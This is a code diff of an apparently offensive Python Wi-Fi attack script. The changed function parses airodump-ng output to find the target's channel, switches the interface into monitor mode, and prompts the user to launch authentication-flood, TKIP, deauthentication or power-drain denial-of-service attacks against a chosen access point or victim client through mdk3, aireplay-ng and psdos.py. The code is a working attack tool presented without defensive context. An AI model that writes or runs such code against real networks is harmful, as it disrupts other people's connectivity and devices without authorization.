@@ -258,32 +258,49 @@ def handle_victims_choices(clients_table, clients):
                 print("Please enter a number from 0- ".format(len(clients)-1))
     return victim
 
-def execute_hack(info, victims):
+def execute_hack(info, victim):
     """
     Takes some information (WHAT?) in order to attack the victim.
     """
-    # Check if victims is empty, continue &print no available victims
 
-    # AUTH DoS
+    # Get channel
     try:
-        auth = subprocess.Popen(["sudo", "mdk3", info.interface, "a", "-a", info.bssid], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = auth.stdout.readline()
-        o_auth, auth_unused_stderr = auth.communicate(timeout=10)
-    except subprocess.TimeoutExpired:
-        auth.terminate()
-    
-    # TKIP DoS
-    try:
-        tkip = subprocess.Popen(["sudo", "mdk3", info.interface, "m", "-t", info.bssid])
-        output = tkip.stdout.readline()
-        o_tkip, auth_unused_stderr = tkip.communicate(timeout=10)
-    except subprocess.TimeoutExpired:
-        tkip.terminate()
+        with open(FILE_PREFIX + "-01.csv") as airodump_file:
+            ap_seen = False  # The first MAC we see is the Access Point / Station
+            for line in airodump_file:
+                line = list(map(str.strip, line.split(",")))
+                if len(line[0].split(":")) == MAC_LENGTH:
+                    line.pop()  # Last entry is an empty string; discard it
+                    if not ap_seen:
+                        ap_seen = True
+                        channel = line[3]
+    except FileNotFoundError as e:
+        sys.exit("No airodump results found - fatal exception: '{}'".format(e))
 
-    # DISASSOC DoS
-    #subprocess.call(["sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", victims[0], "-e", info.ssid, info.interface])
-    # POW MGT Drain
-    # subprocess.call(["sudo", "python", "psdos.py", info.interface, victim[0], info.bssid, "rts"])
+    interface = subprocess.check_output(["nmcli", "-t", "-f", "DEVICE", "connection","show", "--active"]).decode().strip()
+
+    # Set everything into monitor mode again on attack channel
+    subprocess.call(["sudo", "airmon-ng", "check", "kill"])
+    subprocess.call(["sudo", "airmon-ng", "stop", interface])
+    subprocess.call(["sudo", "airmon-ng", "start", interface, channel])
+    subprocess.call(["sudo", "iwconfig", info.interface, "channel", channel])
+
+    print ("Which attack would you like to launch?\n")
+    print ("\nSend the kill signal to end the program! Ctrl+C")
+
+    # CHECK VICTIMS
+    if victim is not None:
+        user_input = input("Enter A for AUTH DoS, D for DISASSOC DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
+        if user_input.lower() == "d": # Disassociation DoS
+            subprocess.call(["sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", victim, "-e", info.ssid, info.interface])
+        elif user_input.lower() == "p": # Power Drain
+            subprocess.call(["sudo", "python", "psdos.py", info.interface, victim, info.bssid, "nullfunction"])
+    else:
+        user_input = input("Enter A for AUTH DoS or T for TKIP DoS: ").strip()
+        if user_input.lower() == "a": # Authentication DoS
+            subprocess.call(["sudo", "mdk3", info.interface, "a", "-a", info.bssid])
+        elif user_input.lower() == "t": # TKIP DoS
+            subprocess.call(["sudo", "mdk3", info.interface, "m", "-t", info.bssid])
 
 if __name__ == "__main__":
     if sudo_user():
